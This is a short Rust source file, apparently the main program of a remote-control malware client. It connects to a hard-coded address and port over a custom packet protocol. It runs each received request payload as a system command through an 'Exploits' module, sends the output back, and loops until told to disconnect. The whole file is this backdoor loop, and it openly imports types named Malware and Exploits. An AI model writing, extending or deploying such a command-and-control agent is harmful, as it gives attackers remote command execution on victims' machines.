
mod exploit;
mod structure;
mod stprotocol;


use std::clone;
use exploit::{Malware, Exploits };
use structure:: {StructStone, StructStonePayload, StoneTransferProtocol, Detector, Generator};
use stprotocol::{ Session, Client };

fn main() {
    let mut client = Session::new("127.0.0.1:6974".to_string());

    loop {
        let mut packet = client.receiving(StructStone::default());

        println!("{:?}", packet.header_type());

        match packet.header_type() {
            StoneTransferProtocol::Request => {
                let ex = Exploits::from(packet.payload).exe_command();
                packet = StructStonePayload::from_ex(ex).to_stone();
                client.send(packet.stone)
            },
            StoneTransferProtocol::Disconnect => { client.disconnect(); break },
            _ => client.send(packet.stone)
        }
    }
}
